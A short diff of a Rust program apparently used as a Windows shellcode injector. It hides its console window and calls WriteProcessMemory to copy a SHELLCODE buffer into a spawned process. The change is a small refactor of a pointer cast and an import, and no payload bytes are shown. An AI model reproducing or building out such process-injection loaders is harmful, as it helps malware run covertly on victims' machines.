@@ -1,6 +1,5 @@
 #![windows_subsystem = "windows"]
 
-use std::ffi::c_void;
 use std::mem::{transmute, zeroed};
 use std::ptr::{null, null_mut};
 use windows_sys::Win32::Foundation::{CloseHandle, FALSE, TRUE};
@@ -59,7 +58,7 @@ fn main() {
         let res = WriteProcessMemory(
             pi.hProcess,
             dest,
-            SHELLCODE.as_ptr() as *const c_void,
+            SHELLCODE.as_ptr().cast(),
             SIZE,
             null_mut(),
         );
